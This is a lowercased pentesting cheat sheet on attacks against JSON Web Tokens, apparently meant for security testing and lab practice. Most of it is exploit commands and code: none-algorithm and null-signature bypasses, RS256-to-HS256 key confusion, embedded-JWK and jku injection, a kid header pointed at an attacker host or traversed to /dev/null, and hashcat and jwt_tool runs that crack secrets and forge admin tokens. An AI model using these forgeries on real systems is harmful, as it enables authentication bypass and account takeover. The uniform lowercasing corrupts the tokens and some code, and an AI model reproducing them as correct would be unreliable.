# jwt - json web token

> json web token (jwt) is an open standard (rfc 7519) that defines a compact and self-contained way for securely transmitting information between parties as a json object. this information can be verified and trusted because it is digitally signed.


## summary

- [tools](#tools)
- [jwt format](#jwt-format)
    - [header](#header)
    - [payload](#payload)
- [jwt signature](#jwt-signature)
    - [jwt signature - null signature attack (cve-2020-28042)](#jwt-signature---null-signature-attack-cve-2020-28042)
    - [jwt signature - disclosure of a correct signature (cve-2019-7644)](#jwt-signature---disclosure-of-a-correct-signature-cve-2019-7644)
    - [jwt signature - none algorithm (cve-2015-9235)](#jwt-signature---none-algorithm-cve-2015-9235)
    - [jwt signature - key confusion attack rs256 to hs256 (cve-2016-5431)](#jwt-signature---key-confusion-attack-rs256-to-hs256-cve-2016-5431)
    - [jwt signature - key injection attack (cve-2018-0114)](#jwt-signature---key-injection-attack-cve-2018-0114)
    - [jwt signature - recover public key from signed jwts](#jwt-signature---recover-public-key-from-signed-jwts)
- [jwt secret](#jwt-secret)
    - [encode and decode jwt with the secret](#encode-and-decode-jwt-with-the-secret)
    - [break jwt secret](#break-jwt-secret)
- [jwt claims](#jwt-claims)
    - [jwt kid claim misuse](#jwt-kid-claim-misuse)
    - [jwks - jku header injection](#jwks---jku-header-injection)
- [labs](#labs)
- [references](#references)


## tools

- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) -  🐍 a toolkit for testing, tweaking and cracking json web tokens
- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - jwt brute force cracker written in c 
- [portswigger/joseph](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) - javascript object signing and encryption pentesting helper
- [jwt.io](https://jwt.io/) - encoder/decoder


## jwt format

json web token : `base64(header).base64(data).base64(signature)`

example : `eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjzdwiioiixmjm0nty3odkwiiwibmftzsi6ikftyxppbmcgsgf4edbyiiwizxhwijoimtq2nji3mdcymiisimfkbwluijp0cnvlfq.ul9pz5hbamdzcv9cs9ocpccjrlkcmlovl2a2aikiaoy`

where we can split it into 3 components separated by a dot.

```powershell
eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9        # header
eyjzdwiioiixmjm0[...]kbwluijp0cnvlfq        # payload
ul9pz5hbamdzcv9cs9ocpccjrlkcmlovl2a2aikiaoy # signature
```


### header

registered header parameter names defined in [json web signature (jws) rfc](https://www.rfc-editor.org/rfc/rfc7515).
the most basic jwt header is the following json.

```json
{
    "typ": "jwt",
    "alg": "hs256"
}
```

other parameters are registered in the rfc.

| parameter | definition                           | description |
|-----------|--------------------------------------|-------------|
| alg       | algorithm                            | identifies the cryptographic algorithm used to secure the jws |
| jku       | jwk set url                          | refers to a resource for a set of json-encoded public keys    |
| jwk       | json web key                         | the public key used to digitally sign the jws                 |
| kid       | key id                               | the key used to secure the jws                                |
| x5u       | x.509 url                            | url for the x.509 public key certificate or certificate chain |
| x5c       | x.509 certificate chain              | x.509 public key certificate or certificate chain in pem-encoded used to digitally sign the jws |
| x5t       | x.509 certificate sha-1 thumbprint)  | base64 url-encoded sha-1 thumbprint (digest) of the der encoding of the x.509 certificate       |
| x5t#s256  | x.509 certificate sha-256 thumbprint | base64 url-encoded sha-256 thumbprint (digest) of the der encoding of the x.509 certificate     |
| typ       | type                                 | media type. usually `jwt` |
| cty       | content type                         | this header parameter is not recommended to use |
| crit      | critical                             | extensions and/or jwa are being used |


default algorithm is "hs256" (hmac sha256 symmetric encryption).
"rs256" is used for asymmetric purposes (rsa asymmetric encryption and private key signature).

| `alg` param value  | digital signature or mac algorithm | requirements |
|-------|------------------------------------------------|---------------|
| hs256 | hmac using sha-256                             | required      |
| hs384 | hmac using sha-384                             | optional      |
| hs512 | hmac using sha-512                             | optional      |
| rs256	| rsassa-pkcs1-v1_5 using sha-256                | recommended   |
| rs384 | rsassa-pkcs1-v1_5 using sha-384                | optional      |
| rs512 | rsassa-pkcs1-v1_5 using sha-512                | optional      |
| es256 | ecdsa using p-256 and sha-256	                 | recommended   |
| es384 | ecdsa using p-384 and sha-384                  | optional      |
| es512 | ecdsa using p-521 and sha-512	                 | optional      |
| ps256 | rsassa-pss using sha-256 and mgf1 with sha-256 | optional      |
| ps384 | rsassa-pss using sha-384 and mgf1 with sha-384 | optional      |
| ps512 | rsassa-pss using sha-512 and mgf1 with sha-512 | optional      |
| none	| no digital signature or mac performed          | required      |

inject headers with [ticarpi/jwt_tool](#): `python3 jwt_tool.py jwt_here -i -hc header1 -hv testval1 -hc header2 -hv testval2`
 

### payload

```json
{
    "sub":"1234567890",
    "name":"amazing haxx0r",
    "exp":"1466270722",
    "admin":true
}
```

claims are the predefined keys and their values:
- iss: issuer of the token
- exp: the expiration timestamp (reject tokens which have expired). note: as defined in the spec, this must be in seconds.
- iat: the time the jwt was issued. can be used to determine the age of the jwt
- nbf: "not before" is a future time when the token will become active.
- jti: unique identifier for the jwt. used to prevent the jwt from being re-used or replayed.
- sub: subject of the token (rarely used)
- aud: audience of the token (also rarely used)

inject payload claims with [ticarpi/jwt_tool](#): `python3 jwt_tool.py jwt_here -i -pc payload1 -pv testval3`


## jwt signature

### jwt signature - null signature attack (cve-2020-28042)

send a jwt with hs256 algorithm without a signature like `eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjzdwiioiixmjm0nty3odkwiiwibmftzsi6ikpvag4grg9liiwiawf0ijoxnte2mjm5mdiyfq.`

**exploit**:
```ps1
python3 jwt_tool.py jwt_here -x n
```

**deconstructed**:
```json
{"alg":"hs256","typ":"jwt"}.
{"sub":"1234567890","name":"john doe","iat":1516239022}
```


### jwt signature - disclosure of a correct signature (cve-2019-7644)

send a jwt with an incorrect signature, the endpoint might respond with an error disclosing the correct one.

* [jwt-dotnet/jwt: critical security fix required: you disclose the correct signature with each signatureverificationexception... #61](https://github.com/jwt-dotnet/jwt/issues/61)
* [cve-2019-7644: security vulnerability in auth0-wcf-service-jwt](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)

```ps1
invalid signature. expected sflkxwrjsmekkf2qt4fwpmejf36pok6yjv_adqssw5c got 9twupvu9wj3pbnegw1ctrf3knr7rx12v-uwocflhxis
invalid signature. expected 8qh5lj5gsaqylksdacidbooqkzhoj0nutkkap8rgb1y= got 8qh5lj5gsaqylksdacidbooqkzhoj0nutkkap8rgboo=
```


### jwt signature - none algorithm (cve-2015-9235)

jwt supports a `none` algorithm for signature. this was probably introduced to debug applications. however, this can have a severe impact on the security of the application.

none algorithm variants:
* `none` 
* `none`
* `none`
* `none`

to exploit this vulnerability, you just need to decode the jwt and change the algorithm used for the signature. then you can submit your new jwt. however, this won't work unless you **remove** the signature

alternatively you can modify an existing jwt (be careful with the expiration time)

* using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
    ```ps1
    python3 jwt_tool.py [jwt_here] -x a
    ```

* manually editing the jwt
    ```python
    import jwt

    jwttoken = 'eyjhbgcioijiuzi1niisinr5cci6ikpxuyj9.eyjsb2dpbii6inrlc3qilcjpyxqioiixnta3nzu1ntcwin0.ywuymgu4yti2zgeyztq1mzyzowrkmji5yziyzmzhzwm0nmrlmwvhntm3ntqwywy2mgu5zgmwnjbmmmu1odq3oq'
    decodedtoken = jwt.decode(jwttoken, verify=false)  					

    # decode the token before encoding with type 'none'
    noneencoded = jwt.encode(decodedtoken, key='', algorithm=none)

    print(noneencoded.decode())
    ```


### jwt signature - key confusion attack rs256 to hs256 (cve-2016-5431)

if a server’s code is expecting a token with "alg" set to rsa, but receives a token with "alg" set to hmac, it may inadvertently use the public key as the hmac symmetric key when verifying the signature.

because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to hs256 and then use the rsa public key to sign the data. when the applications use the same rsa key pair as their tls web server: `openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`

> the algorithm **hs256** uses the secret key to sign and verify each message.
> the algorithm **rs256** uses the private key to sign the message and uses the public key for authentication.

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='hs256')
```

:warning: this behavior is fixed in the python library and will return this error `jwt.exceptions.invalidkeyerror: the specified key is an asymmetric key or x509 certificate and should not be used as an hmac secret.`. you need to install the following version: `pip install pyjwt==0.4.3`.

* using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
    ```ps1
    python3 jwt_tool.py jwt_here -x k -pk my_public.pem
    ```
* using [portswigger/jwt editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. find the public key, usually in `/jwks.json` or `/.well-known/jwks.json`
    2. load it in the jwt editor keys tab, click `new rsa key`.
    3. . in the dialog, paste the jwk that you obtained earlier: `{"kty":"rsa","e":"aqab","use":"sig","kid":"961a...85ce","alg":"rs256","n":"16aflvw6...uglq"}`
    4. select the pem radio button and copy the resulting pem key.
    5. go to the decoder tab and base64-encode the pem.
    6. go back to the jwt editor keys tab and generate a `new symmetric key` in jwk format.
    7. replace the generated value for the k parameter with a base64-encoded pem key that you just copied.
    8. edit the jwt token alg to `hs256` and the data.
    9. click `sign` and keep the option: `don't modify header`

* manually using the following steps to edit an rs256 jwt token into an hs256
    1. convert our public key (key.pem) into hex with this command.

        ```powershell
        $ cat key.pem | xxd -p | tr -d "\\n"
        2d2d2d2d2d424547494e20505[stripped]592d2d2d2d2d0a
        ```

    2. generate hmac signature by supplying our public key as ascii hex and with our token previously edited.

        ```powershell
        $ echo -n "eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyjpzci6ijiziiwidxnlcm5hbwuioij2axnpdg9yiiwicm9szsi6ijeifq" | openssl dgst -sha256 -mac hmac -macopt hexkey:2d2d2d2d2d424547494e20505[stripped]592d2d2d2d2d0a

        (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
        ```

    3. convert signature (hex to "base64 url")

        ```powershell
        $ python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
        ```

    4. add signature to edited payload

        ```powershell
        [header edited rs256 to hs256].[data edited].[signature]
        eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyjpzci6ijiziiwidxnlcm5hbwuioij2axnpdg9yiiwicm9szsi6ijeifq.j0ibnr62h_im34jvjqfpubt7gjlojb-glyyadfijeoa
        ```


### jwt signature - key injection attack (cve-2018-0114)

> a vulnerability in the cisco node-jose open source library before 0.11.0 could allow an unauthenticated, remote attacker to re-sign tokens using a key that is embedded within the token. the vulnerability is due to node-jose following the json web signature (jws) standard for json web tokens (jwts). this standard specifies that a json web key (jwk) representing a public key can be embedded within the header of a jws. this public key is then trusted for verification. an attacker could exploit this by forging valid jws objects by removing the original signature, adding a new public key to the header, and then signing the object using the (attacker-owned) private key associated with the public key embedded in that jws header.


**exploit**:

* using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py [jwt_here] -x i
    ```

* using [portswigger/jwt editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. add a `new rsa key`
    2. in the jwt's repeater tab, edit data
    3. `attack` > `embedded jwk`

**deconstructed**:

```json
{
  "alg": "rs256",
  "typ": "jwt",
  "jwk": {
    "kty": "rsa",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "aqab",
    "n": "ukbgiwyqpqpzbk6_fyep71h3owqyxngjk9tg3y9k_uyhlgkjhmmskm78pwsizzvh7zj0sfjunftgcuyq9voz3m3agj6pj5piuddhlbtyz9xgjhpdi_gkgtmt02rfu9mifp-xz2zrvvgswztpkipn-_cfhktzq4b8t3w1vswtais8bjgq2gbqp0hhztbgn26ziu08wclq1gq4lskgnktjdylsf0e9tddt8pe5-kkwjmnlhekzp_nnb4c2dmpec1ivdmdhv2_dopf-kh_1nyucs9_mnjptf1ndtl_lluyjywilzvlyushayaw6korpgvo2wja2slzvtzvpmfggw7chpw"
  }
}.
{"login":"admin"}.
[signed with new private key; public key injected]
```


### jwt signature - recover public key from signed jwts

the rs256, rs384 and rs512 algorithms use rsa with pkcs#1 v1.5 padding as their signature scheme. this has the property that you can compute the public key given two different messages and accompanying signatures. 

[securabv/jws2pubkey](https://github.com/securabv/jws2pubkey): compute an rsa public key from two signed jwts

```ps1
$ docker run -it ttervoort/jws2pubkey jws1 jws2
$ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
computing public key. this may take a minute...
{"kty": "rsa", "n": "sefrqzskisoruyiawapumf66yoxwymrbf6pqqncdnula8pwi4kdvj2xgngg9xodc-jricmpslvbqw4bag8eih35pcltwyihzv5cbyw6w5hxp747dqwan5lizoxamfe3ydw65cxnanjaxz8vqgozp2ptacwxyupkqvm4ehyaapqxkbbsmhba6160pemar4d1xtrjx6jcywqrbbvzirrxlle9hrohkblsrih8mdvhwyyd40khrpu9b2g_phzecifkimcxrv7idaxh-h_nbs7jt5eonb9xg8k_j7hc9mfhi7ied71cnkg9rlxuhwelz6q-9zzycccs426sfvtcjnx0hrq", "e": "aqab"}
```


## jwt secret

> to create a jwt, a secret key is used to sign the header and payload, which generates the signature. the secret key must be kept secret and secure to prevent unauthorized access to the jwt or tampering with its contents. if an attacker is able to access the secret key, they can create, modify or sign their own tokens, bypassing the intended security controls.

### encode and decode jwt with the secret

* using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): 
    ```ps1
    jwt_tool.py eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjuyw1lijoism9obibeb2uifq.xuev8qrfxu424lzk8bvgr9mqjuirp1rhcpyzw_kssds
    jwt_tool.py eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjuyw1lijoism9obibeb2uifq.xuev8qrfxu424lzk8bvgr9mqjuirp1rhcpyzw_kssds -t
    
    token header values:
    [+] alg = "hs256"
    [+] typ = "jwt"

    token payload values:
    [+] name = "john doe"
    ```
* using [pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`
    ```python
    import jwt
    encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='hs256')
    jwt.decode(encoded, 'secret', algorithms=['hs256']) 
    ```

### break jwt secret

useful list of 3502 public-available jwt: [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list), including `your_jwt_secret`, `change_this_super_secret_random_string`, etc.


#### jwt tool

first, bruteforce the "secret" key used to compute the signature using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

```powershell
python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjzdwiioiixmjm0nty3odkwiiwicm9szsi6invzzxiilcjpyxqioje1mtyymzkwmjj9.1rtmxfvhsjwuh6vxbcalljibghzvrljpaq6dl5qd4yi -d /tmp/wordlist -c
```

then edit the field inside the json web token.

```powershell
current value of role is: user
please enter new value and hit enter
> admin
[1] sub = 1234567890
[2] role = admin
[3] iat = 1516239022
[0] continue to next step

please select a field number (or 0 to continue):
> 0
```

finally, finish the token by signing it with the previously retrieved "secret" key.

```powershell
token signing:
[1] sign token with known key
[2] strip signature from token vulnerable to cve-2015-2951
[3] sign with public key bypass vulnerability
[4] sign token with key file

please select an option from above (1-4):
> 1

please enter the known key:
> secret

please enter the key length:
[1] hmac-sha256
[2] hmac-sha384
[3] hmac-sha512
> 1

your new forged token:
[+] url safe: eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjzdwiioiixmjm0nty3odkwiiwicm9szsi6imfkbwluiiwiawf0ijoxnte2mjm5mdiyfq.xbuxloqclkhxerewmb3da_xtbst0kjw7truyhdwf5ic
[+] standard: eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjzdwiioiixmjm0nty3odkwiiwicm9szsi6imfkbwluiiwiawf0ijoxnte2mjm5mdiyfq.xbuxloqclkhxerewmb3da/xtbst0kjw7truyhdwf5ic
```

* recon: `python3 jwt_tool.py eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyjsb2dpbii6inrpy2fycgkifq.aqncvshlnt9jbftpbphdbt2gbb1myhiissddp8sqvgw`
* scanning: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyjsb2dpbii6inrpy2fycgkifq.bsswqj2c2ui9n7-ajmi3ixvghpuiy7jo9sun9dm15po;anothercookie=test" -m pb`
* exploitation: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyjsb2dpbii6inrpy2fycgkifq.bsswqj2c2ui9n7-ajmi3ixvghpuiy7jo9sun9dm15po;anothercookie=test" -x i -i -pc name -pv admin`
* fuzzing: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyjsb2dpbii6inrpy2fycgkifq.bsswqj2c2ui9n7-ajmi3ixvghpuiy7jo9sun9dm15po;anothercookie=test" -i -hc kid -hv custom_sqli_vectors.txt`
* review: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyjsb2dpbii6inrpy2fycgkifq.bsswqj2c2ui9n7-ajmi3ixvghpuiy7jo9sun9dm15po;anothercookie=test" -x i -i -pc name -pv admin`


#### hashcat

> support added to crack jwt (json web token) with hashcat at 365mh/s on a single gtx1080 - [src](https://twitter.com/hashcat/status/955154646494040065)

* dictionary attack: `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
* rule-based attack: `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
* brute force attack: `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`


## jwt claims

[iana's json web token claims](https://www.iana.org/assignments/jwt/jwt.xhtml)


### jwt kid claim misuse

the "kid" (key id) claim in a json web token (jwt) is an optional header parameter that is used to indicate the identifier of the cryptographic key that was used to sign or encrypt the jwt. it is important to note that the key identifier itself does not provide any security benefits, but rather it enables the recipient to locate the key that is needed to verify the integrity of the jwt.

* example #1 : local file
    ```json
    {
    "alg": "hs256",
    "typ": "jwt",
    "kid": "/root/res/keys/secret.key"
    }
    ```

* example #2 : remote file
    ```json
    {
        "alg":"rs256",
        "typ":"jwt",
        "kid":"http://localhost:7070/privkey.key"
    }
    ```

the content of the file specified in the kid header will be used to generate the signature.

```js
// example for hs256
hmacsha256(
  base64urlencode(header) + "." +
  base64urlencode(payload),
  your-256-bit-secret-from-secret.key
)
```

the common ways to misuse the kid header:
* get the key content to change the payload
* change the key path to force your own
    ```py
    >>> jwt.encode(
    ...     {"some": "payload"},
    ...     "secret",
    ...     algorithm="hs256",
    ...     headers={"kid": "http://evil.example.com/custom.key"},
    ... )
    ```

* change the key path to a file with a predictable content.
  ```ps1
  python3 jwt_tool.py <jwt> -i -hc kid -hv "../../dev/null" -s hs256 -p ""
  python3 jwt_tool.py <jwt> -i -hc kid -hv "/proc/sys/kernel/randomize_va_space" -s hs256 -p "2"
  ```

* modify the kid header to attempt sql and command injections


### jwks - jku header injection

"jku" header value points to the url of the jwks file. by replacing the "jku" url with an attacker-controlled url containing the public key, an attacker can use the paired private key to sign the token and let the service retrieve the malicious public key and verify the token.

it is sometimes exposed publicly via a standard endpoint:

* `/jwks.json`
* `/.well-known/jwks.json`
* `/openid/connect/jwks.json`
* `/api/keys`
* `/api/v1/keys`
* [`/{tenant}/oauth2/v1/certs`](https://docs.theidentityhub.com/doc/protocol-endpoints/openid-connect/openid-connect-jwks-endpoint.html)

you should create your own key pair for this attack and host it. it should look like that:

```json
{
    "keys": [
        {
            "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
            "kty": "rsa",
            "e": "aqab",
            "n": "njb2vtcixwo8dn[...]lu91rysutn0wqzbam-aq"
        }
    ]
}
```

**exploit**:

* using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
    ```ps1
    python3 jwt_tool.py jwt_here -x s
    python3 jwt_tool.py jwt_here -x s -ju http://example.com/jwks.json
    ```
* using [portswigger/jwt editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. generate a new rsa key and host it
    2. edit jwt's data
    3. replace the `kid` header with the one from your jwks
    4. add a `jku` header and sign the jwt (`don't modify header` option should be checked)

**deconstructed**:

```json
{"typ":"jwt","alg":"rs256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}.
{"login":"admin"}.
[signed with new private key; public key exported]
```


## labs 

* [portswigger - jwt authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
* [portswigger - jwt authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
* [portswigger - jwt authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
* [portswigger - jwt authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
* [portswigger - jwt authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
* [portswigger - jwt authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
* [root me - jwt - introduction](https://www.root-me.org/fr/challenges/web-serveur/jwt-introduction)
* [root me - jwt - revoked token](https://www.root-me.org/en/challenges/web-server/jwt-revoked-token)
* [root me - jwt - weak secret](https://www.root-me.org/en/challenges/web-server/jwt-weak-secret)
* [root me - jwt - unsecure file signature](https://www.root-me.org/en/challenges/web-server/jwt-unsecure-file-signature)
* [root me - jwt - public key](https://www.root-me.org/en/challenges/web-server/jwt-public-key)
* [root me - jwt - header injection](https://www.root-me.org/en/challenges/web-server/jwt-header-injection)
* [root me - jwt - unsecure key handling](https://www.root-me.org/en/challenges/web-server/jwt-unsecure-key-handling)


## references

- [5 easy steps to understanding json web token - shaurya sharma - december 21, 2019](https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)
- [attacking jwt authentication - sjoerd langkemper - september 28, 2016](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
- [club eh rm 05 - intro to json web token exploitation - nishacid - february 23, 2023](https://www.youtube.com/watch?v=d7wmuz57nlg)
- [critical vulnerabilities in json web token libraries - tim mclean - march 31, 2015](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//)
- [hacking json web token (jwt) - pwnzzzz - may 3, 2018](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
- [hacking json web tokens - from zero to hero without effort - websecurify - february 9, 2017](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
- [hacking json web tokens - vickie li - october 27, 2019](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
- [hitbgsec ctf 2017 - pasty (web) - amon (j.heng) - august 27, 2017](https://nandynarwhals.org/hitbgsec2017-pasty/)
- [how to hack a weak jwt implementation with a timing attack - tamas polgar - january 7, 2017](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
- [json web token validation bypass in auth0 authentication api - ben knight - april 16, 2020](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
- [json web token vulnerabilities - 0xn3va - march 27, 2022](https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)
- [jwt hacking 101 - trustfoundry - tyler rosonke - december 8, 2017](https://trustfoundry.net/jwt-hacking-101/)
- [learn how to use json web tokens (jwt) for authentication - @dwylhq - may 3, 2022](https://github.com/dwyl/learn-json-web-tokens)
- [privilege escalation like a boss - janijay007 - october 27, 2018](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
- [simple jwt hacking - hari prasanth (@b1ack_h00d) - march 7, 2019](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
- [websec ctf - authorization token - jwt challenge - kris hunt - august 7, 2016](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
- [write up – jrr token – lehack 2019 - laphaze - july 7, 2019](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)